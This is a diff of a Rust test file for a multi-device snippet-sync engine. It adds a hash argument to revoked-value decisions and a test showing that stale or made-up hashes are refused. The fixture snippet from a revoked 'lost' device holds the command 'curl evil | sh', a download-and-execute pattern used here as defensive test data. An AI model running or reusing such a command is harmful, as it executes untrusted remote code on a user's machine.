@@ -1806,7 +1806,11 @@ async fn lost_device_drill() {
         "never republished: {a_names:?}"
     );
     s.engine
-        .sync_revoked_value(item.key, crate::sync::api::RevokedValueChoice::TakeSynced)
+        .sync_revoked_value(
+            item.key,
+            crate::sync::api::RevokedValueChoice::TakeSynced,
+            item.hash,
+        )
         .await
         .expect("decide");
     sync(&s).await;
@@ -2038,6 +2042,7 @@ async fn revoked_writes_applied_on_stale_device_are_not_republished_after_rejoin
             .sync_revoked_value(
                 from_l.key.clone(),
                 crate::sync::api::RevokedValueChoice::KeepAsMine,
+                from_l.hash.clone(),
             )
             .await
             .expect("keep");
@@ -2052,6 +2057,113 @@ async fn revoked_writes_applied_on_stale_device_are_not_republished_after_rejoin
                 .any(|sn| sn.name == "From L")
         );
     }
+}
+
+/// A3 (S2c-1 review): a held value shows what is decided (this device's
+/// value, the synced one) and a decision names its hash: once the value
+/// changed since it was shown, the decision is refused until reloaded.
+#[tokio::test]
+async fn revoked_value_refuses_a_stale_hash() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let l = device(&sim);
+    let s = device(&sim);
+    create(&a, &folder).await;
+    join_named(&l, &folder, "Lost", STRONG).await;
+    join_named(&s, &folder, "Stale", STRONG).await;
+    for device in [&a, &l, &s] {
+        sync(device).await;
+    }
+    let l_previous = sim
+        .with(|st| st.files.get(&snap_key(&l)).cloned())
+        .expect("l");
+    l.engine
+        .save_snippet(snippet("From L", "curl evil | sh"))
+        .await
+        .expect("s");
+    sync(&l).await;
+    sync(&s).await;
+    put_file(&sim, &snap_key(&l), l_previous);
+    s.engine
+        .sync_set_options(SyncOptions {
+            remember_key: false,
+        })
+        .await
+        .expect("options");
+    let s = Device {
+        engine: restart(&s, &sim),
+        ..s
+    };
+    forget(&a, vec![id_of(&l)], STRONG, STRONG_2).await;
+    let _ = unlock(&s, STRONG).await.expect("previous keys");
+    let _ = unlock(&s, STRONG_2).await;
+    let _ = s.engine.sync_now().await;
+    let held = s.engine.sync_revoked_values().await.expect("held");
+    let shown = held
+        .iter()
+        .find(|item| matches!(&item.subject, SyncSubject::Snippet { .. }))
+        .expect("L's snippet held")
+        .clone();
+    // What is decided is shown: this device's value.
+    match &shown.local {
+        Some(crate::sync::api::SyncValue::Snippet(value)) => {
+            assert_eq!(value.command, "curl evil | sh");
+        }
+        other => panic!("local value shown: {other:?}"),
+    }
+    assert!(!shown.hash.is_empty());
+
+    // The value changes on this device after it was shown.
+    let mut edited = s
+        .engine
+        .snippets()
+        .await
+        .expect("s")
+        .into_iter()
+        .find(|sn| sn.name == "From L")
+        .expect("held locally");
+    edited.command = "uptime".into();
+    s.engine.save_snippet(edited).await.expect("edit");
+    let refused = s
+        .engine
+        .sync_revoked_value(
+            shown.key.clone(),
+            crate::sync::api::RevokedValueChoice::KeepAsMine,
+            shown.hash.clone(),
+        )
+        .await
+        .expect_err("stale hash");
+    assert_eq!(refused.summary().code, "sync_not_pending");
+    // Nothing was decided: still held, with the new content and hash.
+    let _ = s.engine.sync_now().await;
+    let reloaded = s.engine.sync_revoked_values().await.expect("held");
+    let fresh = reloaded
+        .iter()
+        .find(|item| item.key == shown.key)
+        .expect("still held")
+        .clone();
+    assert_ne!(fresh.hash, shown.hash);
+    // A made-up hash is refused too.
+    let made_up = s
+        .engine
+        .sync_revoked_value(
+            fresh.key.clone(),
+            crate::sync::api::RevokedValueChoice::TakeSynced,
+            "00".into(),
+        )
+        .await
+        .expect_err("unknown hash");
+    assert_eq!(made_up.summary().code, "sync_not_pending");
+    s.engine
+        .sync_revoked_value(
+            fresh.key.clone(),
+            crate::sync::api::RevokedValueChoice::TakeSynced,
+            fresh.hash.clone(),
+        )
+        .await
+        .expect("decided with the shown hash");
+    let after = s.engine.sync_revoked_values().await.expect("held");
+    assert!(after.iter().all(|item| item.key != shown.key));
 }
 
 // ── Named tests of the review table (§13.11), each on its own ─────────────
